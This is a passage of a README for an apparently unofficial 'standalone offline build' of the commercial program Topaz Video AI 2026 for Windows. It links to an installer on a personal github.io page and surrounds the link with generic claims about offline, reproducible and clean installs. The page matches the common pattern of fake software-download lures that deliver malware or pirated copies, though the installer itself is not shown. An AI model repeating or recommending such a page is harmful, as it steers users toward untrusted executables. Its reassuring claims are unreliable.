<div align="center">

# 🎬 Topaz Video AI 2026: Standalone Offline Build for Windows 11

<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--14-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">

</div>

## 📦 Intro

This repository publishes a standalone offline Windows x64 distribution package intended for the Topaz Video AI workflow on Windows 10 and 11. The bundle is self-contained: a single executable setup that provisions the runtime, dependencies, and application files without contacting external servers during installation. It is maintained as a reproducible deployment artifact for users who prefer to control when and how their environment changes.

The distribution targets air-gapped workstations, bandwidth-constrained environments, and reviewers who need a stable, repeatable install baseline. Because everything ships in one package, deployment can be scripted, archived, and replayed on identical hardware without surprises from background update channels. This makes the build suitable for lab machines, training rooms, and CI-style validation hosts that are reset frequently.

Format coverage includes common video container and codec families used in the video editing workflow, along with the standard sidecar files expected by upstream tooling. A single Topaz Video AI standalone deployment covers both portable and installed modes, and the installer can be staged from removable media or an internal file share without modification.

## 01 · ⬇️ Download

<p align="center">
  <a href="https://bradburns2001.github.io/topaz-video-ai-desktop/">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
      <img src="docs/buttons/installer-card.svg" alt="" width="440">
    </picture>
  </a>
</p>

<p align="center">
  <img src="docs/buttons/banner.png" alt="Topaz Video AI 2026 standalone build running on Windows 11, interface banner" width="100%">
</p>

## 02 · ✨ Features

<table>
<tr>
<td width="33%" valign="top">

**📦 Self-Contained Bundle**

All runtime, codec, and helper components ship inside a single setup file.

</td>
<td width="33%" valign="top">

**📴 Offline-First Deployment**

Installation completes without contacting external endpoints after the initial retrieval.

</td>
<td width="33%" valign="top">

**🔁 Reproducible Installs**

Versioned packaging supports identical reinstalls across lab and training environments.

</td>
</tr>
<tr>
<td valign="top">

**🧾 Hash Verification**

SHA256 checksums are published alongside each release for post-download integrity checks.

</td>
<td valign="top">

**🗂️ Portable Mode**

A per-user directory layout allows the build to run from removable media on demand.

</td>
<td valign="top">

**🧹 Clean Uninstall**

Registered through standard Windows install entries so removal leaves no system residue.

</td>
</tr>
</table>

## 03 · ⚙️ How it works

The distribution ships as a versioned Windows executable that unpacks application binaries, runtime libraries, and support assets into a program directory. By default it uses the per-user program path, leaving system directories untouched. Bundled assets are laid down in a fixed order so the resulting file tree is deterministic across machines.

On first launch the build registers itself with Windows via the standard installer entry, writes default configuration to the user profile, and performs a short integrity check of its bundled assets. No background service is installed. Default config lives under the user profile application data folder and can be backed up or cloned to other hosts.

Day-to-day runtime is fully local: no network calls are required once the initial install finishes. Updates are delivered as a newer versioned package; running it over the existing install preserves user data, templates, and preferences. There is no separate updater daemon watching for changes.

The build integrates with Windows through the registry only for standard install entries and optional shell associations. It can coexist alongside other installs of similar tooling because it uses a scoped program path and per-user config. File associations are opt-in and can be changed from Windows Settings without reinstalling.

## 04 · 🧩 Compatibility

The standalone build supports Windows 10 and Windows 11 on x64 hardware. Both Home and Pro editions are supported; no minimum build number beyond the current servicing baseline is enforced. 32-bit and ARM targets are out of scope for this distribution.

The installer runs cleanly under Powe